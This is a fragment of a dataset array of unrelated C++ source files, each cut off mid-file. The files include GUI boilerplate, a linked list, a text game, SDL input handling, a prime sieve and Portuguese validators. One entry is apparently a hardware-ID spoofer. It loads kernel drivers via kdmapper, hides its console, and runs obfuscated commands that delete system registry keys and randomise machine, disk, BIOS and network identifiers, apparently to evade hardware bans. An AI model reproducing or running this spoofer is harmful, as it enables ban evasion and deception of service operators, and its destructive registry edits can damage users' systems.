false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// wxWidgets \"Hello World\" Program available on https://docs.wxwidgets.org/trunk/overview_helloworld.html\r\n\r\n// For compilers that support precompilation, includes \"wx/wx.h\".\r\n#include <wx/wxprec.h>\r\n#ifndef WX_PRECOMP\r\n    #include <wx/wx.h>\r\n#endif\r\n\r\nclass MyApp : public wxApp \r\n{\r\npublic:\r\n    virtual bool OnInit(); \r\n}; \r\n\r\nclass MyFrame : public wxFrame\r\n{\r\npublic:\r\n    MyFrame();\r\nprivate:\r\n    void OnHello(wxCommandEvent& event);\r\n    void OnExit(wxCommandEvent& event);\r\n    void OnAbout(wxCommandEvent& event);\r\n};\r\n\r\nenum\r\n{\r\n    ID_Hello = 1\r\n};\r\n\r\nwxIMPLEMENT_APP(MyApp);\r\n\r\nbool MyApp::OnInit()\r\n{\r\n    MyFrame *frame = new MyFrame();\r\n    frame->Show(true);\r\n    return true;\r\n}\r\n\r\nMyFrame::MyFrame() : wxFrame(NULL, wxID_ANY, \"Hello World\")\r\n{\r\n    wxMenu *menuFile = new wxMenu;\r\n    menuFile->Append(ID_Hello, \"&Hello...\\tCtrl-H\", \"Help string shown in status bar for this menu item\");\r\n    menuFile->AppendSeparator();\r\n    menuFile->Append(wxID_EXIT);\r\n\r\n    wxMenu *menuHelp = new wxMenu;\r\n    menuHelp->Append(wxID_ABOUT);\r\n\r\n    wxMenuBar *menuBar = new wxMenuBar;\r\n    menuBar->Append(menuFile, \"&File\");\r\n    menuBar->Append(menuHelp, \"&Help\");\r\n    SetMenuBar( menuBar );\r\n\r\n    CreateStatusBar();\r\n\r\n    SetStatusText(\"Welcome to wxWidgets!\");\r\n\r\n    Bind(wxEVT_MENU, &MyFrame::OnHello, this, ID_Hello);\r\n    Bind(wxEVT_MENU, &MyFrame::OnAbout, this, wxID_ABOUT);\r\n    Bind(wxEVT_MENU, &MyFrame::OnExit, this, wxID_EXIT);\r\n}\r\n\r\nvoid MyFrame::OnExit(wxCommandEvent& event)\r\n{\r\n    Close(true);\r\n}\r\n\r\nvoid MyFrame::OnAbout(wxCommandEvent& event)\r\n{\r\n    wxMessageBox(\"This is a wxWidgets Hello World example\", \"About Hello World\", wxOK | wxICON_INFORMATION);\r\n}\r\n\r\nvoid MyFrame::OnHello(wxCommandEvent& event)\r\n{\r\n    wxLogMessage(\"Hello world from wxWidgets!\");\r\n}\r\n",
    "#include<iostream>\r\nusing namespace std;\r\nclass node{\r\n    public:\r\n    int data;\r\n    node*next;\r\n    //constructor\r\n    node(int a){\r\n        this->data=a;\r\n        this->next=NULL;\r\n    }\r\n    //distructor\r\n    ~node(){\r\n        int value=this->data;\r\n        //memory free\r\n        if(this->next!=NULL){\r\n            delete next;\r\n            this->next=NULL;\r\n        }\r\n        cout<<\"Memory is free for node with data \"<<value<<endl;\r\n    }\r\n\r\n};\r\n\r\nvoid InsertAtTail(node*&tail,int d){\r\n    node*temp=new node(d);\r\n    tail->next=temp;\r\n    tail=tail->next;\r\n}\r\n\r\nvoid InserAtHead(node*&head,int d){\r\n    //new node create\r\n    node*temp=new node(d);\r\n    temp->next=head;\r\n    head=temp;\r\n}\r\n\r\nvoid InsertAtPosition(node*&tail,node*&head,int position,int d){\r\n     node*temp=head;\r\n     // insert at Start\r\n     if(position ==1){\r\n        InserAtHead(head,d);\r\n        return;\r\n     }\r\n// void InsertAtPosition(node*&head,int position,int d){\r\n//      node*temp=head;\r\n//      if(position ==1){\r\n//         node*t=new node(d);\r\n//         t->next=temp;\r\n//         head=t;\r\n//         return;\r\n//      }\r\n     int cnt=1;\r\n     while(cnt<position-1){\r\n        temp=temp->next;\r\n        cnt++;\r\n     }\r\n\r\n     //inserting at Last Position\r\n     if(temp->next==NULL){\r\n        InsertAtTail(tail,d);\r\n        return;\r\n     }\r\n\r\n     //creating new node\r\n     node*nodeToInsert=new node(d);\r\n     nodeToInsert->next=temp->next;\r\n     temp->next=nodeToInsert;\r\n}\r\n\r\nvoid print(node*&head){\r\n    node*temp=head;\r\n    while(temp!=NULL){\r\n        cout<<temp->data<<\" \";\r\n        temp=temp->next;\r\n    }\r\n    cout<<endl;\r\n}\r\n\r\nvoid deletrNode(node*&head,int position){\r\n    //deleting first or start Node\r\n    if(position==1){\r\n        node*temp=head;\r\n        head=head->next;\r\n        //memory free start node\r\n        temp->next=NULL;\r\n        delete temp;\r\n    }\r\n    else{\r\n        // delete any middle node or last node\r\n        node*curr=head;\r\n        node*prev=NULL;\r\n\r\n        int cnt=1;\r\n        while(cnt<position){\r\n            prev=curr;\r\n            curr=curr->next;\r\n            cnt++;\r\n        }\r\n        prev->next=curr->next;\r\n        curr->next=NULL;\r\n        delete curr;\r\n    }\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nint main(){\r\n    node*node1=new node(10);\r\n\r\n    node*head=node1;\r\n    node*tail=node1;\r\n\r\n    print(head);\r\n\r\n    InserAtHead(head,12);\r\n    print(head);\r\n  \r\n\r\n\r\n    InsertAtTail(tail,30);\r\n    print(head);\r\n\r\n    InsertAtPosition(tail,head,3,50);\r\n    print(head);\r\n\r\n    InsertAtPosition(tail,head,5,110);\r\n    print(head);\r\n\r\n    InsertAtPosition(tail,head,1,1);\r\n    print(head);\r\n\r\n    deletrNode(head,3);\r\n    print(head);\r\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\n#include <chrono>\r\n#include <thread>\r\n#include <iomanip>\r\n#include <vector>\r\n#include <algorithm>\r\n#include \"utility_functions.h\"\r\n#include \"combat.h\"\r\n#include \"sections.h\"\r\nusing namespace std;\r\n\r\nint execute_section(int section_number, int* player_health, vector<Section>& sections);\r\n\r\nint main() {\r\n\r\n\t// Initializing the game\r\n\tint section_number = 0;\r\n\tint player_health = 99;\r\n\tvector<Section> sections = { {4, 0, 0, { false, false, false, false}, \"00\", false, false },\r\n\t\t{6, 0, 0, { false, false, false, false, false, false }, \"0000\", false, false },\r\n\t\t{4, 0, 0, { false, false, false, false }, \"No door lock\", false, false }\r\n\t};\r\n\r\n\t//starting_scene(&player_health);\r\n\r\n\twhile (section_number != -1 || section_number != 100) {\r\n\t\tsection_number = execute_section(section_number, &player_health, sections);\r\n\t}\r\n\r\n\treturn 0;\r\n}\r\n\r\nint execute_section(int section_number, int* player_health, vector<Section>& sections) {\r\n\tswitch (section_number) {\r\n\tcase 0:\r\n\t\treturn starting_cell(player_health, sections[0]);\r\n\tcase 1:\r\n\t\treturn hallway(player_health);\r\n\tcase 2:\r\n\t\treturn guard_room(player_health, sections[1]);\r\n\tcase 3:\r\n\t\treturn river(player_health, sections);\r\n\tcase 4:\r\n\t\treturn forest(player_health, sections[2]);\r\n\tcase 5:\r\n\t\treturn castle(player_health);\r\n\tcase 6:\r\n\t\treturn graveyard(player_health);\r\n\tcase -1:\r\n\t\tclear();\r\n\t\toutput(\"You have run out of health. You watch the light fade as you dissolve into shadow.\");\r\n\t\tcout << endl;\r\n\t\toutput(\"(close the window and restart to play again)\");\r\n\t\tpause();\r\n\t\treturn -1;\r\n\tcase 100:\r\n\t\treturn 100;\r\n\tdefault:\r\n\t\toutput(\"Work in progress...\");\r\n\t}\r\n}",
    "//StHomeLess#2465\r\n#pragma once\r\n#include <iostream>\r\n#include <urlmon.h>\r\n\r\n#include \"xhackorx.hpp\"\r\n#include \"mac.h\"\r\n#include \"kdmapper.hpp\"\r\n#include \"driver.h\"\r\n\r\n#pragma comment(lib, \"urlmon.lib\")\r\n#define _CRT_SECURE_NO_WARNINGS\r\n#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))\r\n#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))\r\n\r\n//---------------UTILS--------------//\r\n\r\nusing namespace std;\r\nvoid HideConsole()\r\n{\r\n\t::ShowWindow(::GetConsoleWindow(), SW_HIDE);\r\n}\r\n\r\nvoid ShowConsole()\r\n{\r\n\t::ShowWindow(::GetConsoleWindow(), SW_SHOW);\r\n}\r\n\r\n//---------------REGS--------------//\r\n\r\nint regedit()\r\n{\r\n\tHideConsole();\r\n\tsystem(XorString(\"reg delete HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\TimeZoneInformation /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion\\\\Notifications\\\\Data /v 418A073AA3BC3475 /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f\"));\r\n\tsystem(XorString(\"reg delete HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0 /f\") );\r\n\tsystem(XorString(\"REG ADD HKCU\\\\Software\\\\Microsoft\\\\Direct3D /v WHQLClass /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\ComputerName\\\\ComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\ComputerName\\\\ActiveComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WindowsUpdate /v SusClientId /t REG_SZ /d %random%%random%-%random%-%random%-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\HardwareConfig /v LastConfig /t REG_SZ /d {%random%-%random%-%random} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\HardwareConfig\\\\Current /v BaseBoardProduct /t REG_SZ /d %random%-%random%%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\Software\\\\Microsoft /v BuildLab /t REG_SZ /d %random%-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\Software\\\\Microsoft /v BuildLabEx /t REG_SZ /d %random%-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\BIOS /v BaseBoardProduct /t REG_SZ /d %random%-%random%%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\kbdclass\\\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\mouhid\\\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4d36e968-e325-11ce-bfc1-08002be10318}\\\\0000 /v UserModeDriverGUID /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion /v BuildBranch /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion /v BuildGUID /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion /v BuildLab /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi\\\" \\\"Port\\\" \\\"0\\\\Scsi\\\" \\\"Bus\\\" \\\"0\\\\Target\\\" \\\"Id\\\" \\\"0\\\\Logical\\\" \\\"Unit\\\" \\\"Id\\\" \\\"0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi\\\" \\\"Port\\\" \\\"1\\\\Scsi\\\" \\\"Bus\\\" \\\"0\\\\Target\\\" \\\"Id\\\" \\\"0\\\\Logical\\\" \\\"Unit\\\" \\\"Id\\\" \\\"0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\MultifunctionAdapter\\\\0\\\\DiskController\\\\0\\\\DiskPeripheral\\\\0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\MultifunctionAdapter\\\\0\\\\DiskController\\\\0\\\\DiskPeripheral\\\\1 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\BasicDisplay\\\\Video /v VideoID /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\SQMClient /v MachineId /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters /v Hostname /t REG_SZ /d DESKTOP-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters /v Domain /t REG_SZ /d %random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\DevQuery\\\\6 /v UUID /t R",
    "\n#include \"InputController.h\"\n#include \"SDL.h\"\n#include \"GameController.h\"\n\nInputController::InputController():mQuit(nullptr), mnoptrCurrentController(nullptr)\n{\n\n}\n\nvoid InputController::Init(InputAction quitAction)\n{\n\tmQuit = quitAction;\n}\n\nvoid InputController::Update(uint32_t dt)\n{\n\tSDL_Event sdlEvent;\n\n\twhile(SDL_PollEvent(&sdlEvent))\n\t{\n\t\tswitch(sdlEvent.type)\n\t\t{\n\t\tcase SDL_QUIT:\n\t\t{\n\t\t\tmQuit(dt, SDL_PRESSED);\n\t\t}\n\t\tbreak;\n\t\tcase SDL_MOUSEMOTION:\n\t\t{\n\t\t\tif(mnoptrCurrentController)\n\t\t\t{\n\t\t\t\tif(MouseMovedAction mouseMoved = mnoptrCurrentController->GetMouseMovedAction())\n\t\t\t\t{\n\t\t\t\t\tMousePosition position;\n\t\t\t\t\tposition.xPos = sdlEvent.motion.x;\n\t\t\t\t\tposition.yPos = sdlEvent.motion.y;\n\t\t\t\t\tmouseMoved(position);\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase SDL_MOUSEBUTTONUP:\n\t\tcase SDL_MOUSEBUTTONDOWN:\n\t\t\tif(mnoptrCurrentController)\n\t\t\t{\n\t\t\t\tMouseInputAction action = mnoptrCurrentController->GetMouseButtonActionForMouseButton(static_cast<MouseButton>(sdlEvent.button.button));\n\n\t\t\t\tMousePosition position;\n\t\t\t\tposition.xPos = sdlEvent.button.x;\n\t\t\t\tposition.yPos = sdlEvent.button.y;\n\n\t\t\t\taction(static_cast<InputState>(sdlEvent.button.state), position);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase SDL_KEYDOWN:\n\t\tcase SDL_KEYUP:\n\n\t\t\tif(mnoptrCurrentController)\n\t\t\t{\n\t\t\t\tInputAction action = mnoptrCurrentController->GetActionForKey(sdlEvent.key.keysym.sym);\n\n\t\t\t\taction(dt, static_cast<InputState>(sdlEvent.key.state));\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nvoid InputController::SetGameController(GameController* controller)\n{\n\tmnoptrCurrentController = controller;\n}\n",
    "#include <bits/stdc++.h>\r\n#include <ext/pb_ds/assoc_container.hpp>\r\n#include <ext/pb_ds/tree_policy.hpp>\r\n\r\nusing namespace std;\r\nusing namespace __gnu_pbds;\r\n\r\n#define ull unsigned long long int\r\n#define ld long double\r\n#define ll long long\r\n#define PI acos(-1)\r\n#define endl \"\\n\"\r\n#define all(x) x.begin(), x.end()\r\n#define fixed(n) cout << fixed << setprecision(n)\r\n#define loop(i, n) for (int i = 0; i < (int)n; i++)\r\n\r\nconst int OO = 0x3f3f3f3f;\r\nconst int N = 1e5 + 7;\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\nvoid Ahmed_Faraj()\r\n{\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(nullptr);\r\n    cout.tie(nullptr);\r\n#ifndef ONLINE_JUDGE\r\n    freopen(\"input.txt\", \"r\", stdin);\r\n    freopen(\"output.txt\", \"w\", stdout);\r\n#endif\r\n}\r\n\r\n/*Solution*/\r\n\r\nll prime[N];\r\nvector<ll> ans;\r\nvoid sieve()\r\n{\r\n    for (int i = 0; i < N; i++)\r\n        prime[i] = 1;\r\n    prime[0] = prime[1] = 0;\r\n    for (int i = 4; i < N; i += 2)\r\n    {\r\n        prime[i] = 0;\r\n    }\r\n    for (int i = 3; i * i < N; i += 2)\r\n    {\r\n        if (prime[i])\r\n        {\r\n            for (int j = i * i; j < N; j += i + i)\r\n            {\r\n                prime[j] = 0;\r\n            }\r\n        }\r\n    }\r\n    for (int i = 0; i < N - 1; i++)\r\n    {\r\n        if(prime[i])\r\n            ans.push_back(i);\r\n    }\r\n}\r\n\r\nvoid solve()\r\n{\r\n    ll n;\r\n    cin >> n;\r\n    ll cnt = lower_bound(all(ans),n) - ans.begin();\r\n    if(prime[n]){\r\n        cnt++;\r\n    }\r\n    cnt++;\r\n    // cout << cnt << endl;\r\n    cout << pow(ceil(log2((long double)n)) / cnt, 1 / ceil(log2((long double)n))) << endl;\r\n}\r\n\r\nsigned main()\r\n{\r\n    Ahmed_Faraj();\r\n    sieve();\r\n    ll test = 1;\r\n    cin >> test;\r\n    while (test--)\r\n    {\r\n        solve();\r\n    }\r\n    return 0;\r\n}",
    "#include \"dominios.hpp\"\n#include <string>\n#include <regex>\n#include <cstdlib>\n\n//funcoes de assistencia\n\nbool isUpperCase(char caractere){\n\n    if(caractere < 'A' || caractere > 'Z'){\n        return 0;\n    }\n\n    return 1;\n\n}\n\nbool checkNome(string nomeTeste){\n\n    if(isUpperCase(nomeTeste[0])==0){\n        return 0;\n    }\n    if(nomeTeste.length()<3 || nomeTeste.length()>10){\n        return 0;\n    }\n\n    return 1;\n\n}\n\n//metodos da classe Percentual\n\nbool Percentual::validar(int valorTeste){\n\n    if(0 <= valorTeste && valorTeste <= 100){\n        return 1;\n    }\n    return 0;\n}\n\nvoid Percentual::setPercentual(int valor){\n    if( validar(valor) ){\n        this->valor = valor;\n    }\n}\n\n//metodos da classe Estado\n\nbool Estado::validar(std::string estadoTeste){\n\n    std::string estadosPossiveis[3] = {\"Previsto\", \"Liquidado\", \"Inadimplente\"};\n\n    for(int i = 0; i < 3; i++){\n\n        if(estadoTeste == estadosPossiveis[i]){\n            return 1;\n        }\n\n    }\n\n    return 0;\n\n}\n\nvoid Estado::setEstado(std::string tipoEstado){\n\n    if( validar(tipoEstado) ){\n        this->tipoEstado = tipoEstado;\n    }\n\n}\n\n//metodos da classe Dinheiro\n\nbool Dinheiro::validar(float valorTeste){\n\n    if(0<=valorTeste && valorTeste <= 1000000){\n        return 1;\n    }\n    return 0;\n\n}\n\nvoid Dinheiro::setDinheiro(float valor){\n\n    if( validar(valor) ){\n        this->valor = valor;\n    }\n\n}\n\n//metodos da classe Setor\n\nbool Setor::validar(std::string setorTeste){\n\n    std::string setoresPossiveis[10] = {\"Agricultura\", \"Constru\u00e7\u00e3o civil\", \"Energia\", \"Finan\u00e7as\", \"Imobili\u00e1rio\",\n    \"Papel e celulose\", \"Pecu\u00e1ria\", \"Qu\u00edmica e petroqu\u00edmica\", \"Metalurgia e siderurgia\", \"Minera\u00e7\u00e3o\"};\n\n    for(int i = 0; i < 10; i++){\n        if(setorTeste == setoresPossiveis[i]){\n            return 1;\n        }\n    }\n\n    return 0;\n\n}\n\nvoid Setor::setSetor(std::string nomeSetor){\n\n    if( validar(nomeSetor) ){\n        this->nomeSetor = nomeSetor;\n    }\n\n}\n\n//metodos da classe codPagamento\n\nbool codPagamento::validar(std::string codigoTeste){\n\n    if(codigoTeste.length() != 8){\n        return 0;\n    }\n\n    if(codigoTeste[0]<'1' || codigoTeste[0]>'9'){\n        return 0;\n    }\n\n    for(int i=0; i<8; i++){\n        if(isdigit(codigoTeste[i])== 0){\n            return 0;\n        }\n    }\n\nreturn 1;\n\n}\n\nvoid codPagamento::setCodPagamento(std::string codigo){\n\n    if( validar(codigo) ){\n        this->codigo = codigo;\n    }\n\n}\n\n//metodos da classe Nome\n\nbool Nome::validar(std::string nomeTeste){\n\n    int blankSpaceIndex;\n    int blankSpaceQuantity = 0;\n    std::string primeiroNome = \"\", sobreNome = \"\";\n\n    for (int i=0; i<nomeTeste.length();i++){ //loop para contar numero de espa\u00e7os em branco\n        if( isblank(nomeTeste[i]) ){\n            blankSpaceQuantity++;\n        }\n        if( isalpha(nomeTeste[i]) == 0 && nomeTeste[i] != ' '){\n            return 0;\n        }\n    }\n\n    switch(blankSpaceQuantity){\n\n        case 0:\n            return checkNome(nomeTeste);\n\n        case 1:\n            blankSpaceIndex = nomeTeste.find(' ');\n            primeiroNome.insert(0,nomeTeste,0,blankSpaceIndex);\n            sobreNome.append(nomeTeste,blankSpaceIndex+1);\n\n            return (checkNome(primeiroNome) && checkNome(sobreNome));\n\n        default:\n        return 0;\n\n    }\n\n}\n\nvoid Nome::setNome(std::string nome){\n\n        if(validar(nome)){\n            this-> nome = nome;\n        }\n\n}\n\n//metodos da classe CodigoTitulo\n\nbool CodigoTitulo::validar(std::string codigoTeste){\n\n    if(codigoTeste.length() != 11){\n        return 0;\n    }\n\n    std::string codigosPossiveis[6] = {\"CDB\", \"CRA\", \"CRI\", \"LCA\", \"LCI\", \"DEB\"};\n    std::string inicio = \"\";\n    std::string final = \"\";\n    bool valInicio=0, valFinal=1;\n\n    inicio.insert(0,codigoTeste,0,3);\n    final.append(codigoTeste,3);\n\n    for(int i=0;i<8;i++){\n        if(inicio == codigosPossiveis[i]){\n            valInicio = 1;\n        }\n    }\n\n    for(int i=0;i<8;i++){\n\n        if(isUpperCase(final[i]) == 0  && isdigit(final[i])==0){\n            valFinal = 0;\n        }\n    }\n\n    return (valInicio && valFinal);\n\n}\n\nvoid CodigoTitulo::setCodigoTitulo(std::string codigo){\n\n    if(validar(codigo)){\n        this->codigo = codigo;\n    }\n\n}\n\n//metodos da classe Data\n\nbool Data::validar(std::string DataTeste){\n\n    if( regex_match(DataTeste,regex(\"^\\\\d{2}[-]\\\\d{2}[-]\\\\d{4}$\")) == 0){\n        return 0;\n    }\n\n    int dia,mes,ano;\n    string temp;\n    bool anoBissexto;\n\n    temp.assign(DataTeste,0,2);\n    dia = atoi(temp.c_str());\n\n    temp.assign(DataTeste,3,2);\n    mes = atoi(temp.c_str());\n\n    temp.assign(DataTeste,6,4);\n    ano = atoi(temp.c_str());\n\n    if(dia<1 || dia>31){\n        return 0;\n    }\n\n    if(mes<1 || mes>12){\n        return 0;\n    }\n\n    if(ano<2000 || ano>2100){\n        return 0;\n    }\n\n    anoBissexto = ( (ano-2000)%4==0 )? true : false;\n\n    if(mes == 2){\n\n        if(anoBissexto){\n            return (dia <= 29);\n        } else {\n            return (dia <= 28);\n        }\n\n        return 1;\n    }\n\n    if(mes == 4 || mes == 6 || m",
    "#include \"ofApp.h\"\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(39);\r\n\tofNoFill();\r\n\tofEnableDepthTest();\r\n\r\n\tofColor color;\r\n\tthis->number_of_sphere = 70;\r\n\twhile (this->box_list.size() < this->number_of_sphere) {\r\n\r\n\t\tauto tmp_location = this->make_point(280, ofRandom(0, 50), ofRandom(360), ofRandom(360));\r\n\t\tauto radius = this->box_list.size() < 50 ? ofRandom(20, 60) : ofRandom(10, 20);\r\n\r\n\t\tbool flag = true;\r\n\t\tfor (int i = 0; i < this->box_list.size(); i++) {\r\n\r\n\t\t\tif (glm::distance(tmp_location, get<1>(this->box_list[i])) < get<2>(this->box_list[i]) + radius) {\r\n\r\n\t\t\t\tflag = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (flag) {\r\n\r\n\t\t\tcolor.setHsb(ofRandom(255), 255, 200);\r\n\t\t\tthis->box_list.push_back(make_tuple(color, tmp_location, radius));\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() {\r\n\r\n\tofSeedRandom(39);\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tthis->cam.begin();\r\n\tofRotateZ(ofGetFrameNum() * 0.77);\r\n\r\n\tfor (int i = 0; i < this->box_list.size(); i++) {\r\n\r\n\t\tauto color = get<0>(this->box_list[i]);\r\n\t\tauto location = get<1>(this->box_list[i]);\r\n\t\tauto radius = get<2>(this->box_list[i]);\r\n\r\n\t\tofPushMatrix();\r\n\t\tofTranslate(location);\r\n\r\n\t\tfor (int k = 0; k < 8; k++) {\r\n\r\n\t\t\tauto noise_seed = glm::vec3(ofRandom(1000), ofRandom(1000), ofRandom(1000));\r\n\t\t\tcolor.setHsb(int(color.getHue() + 32) % 255, 255, 255);\r\n\r\n\t\t\tfor (int m = 0; m < 200; m++) {\r\n\t\t\t\t\r\n\t\t\t\tofSetColor(color, ofMap(m, 0, 200, 32, 255));\r\n\r\n\t\t\t\tauto vertex = glm::vec3(\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.x, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.y, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.z, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85)\r\n\t\t\t\t);\r\n\r\n\t\t\t\tauto next = glm::vec3(\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.x, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.y, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.z, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85)\r\n\t\t\t\t);\r\n\r\n\t\t\t\tvertex = 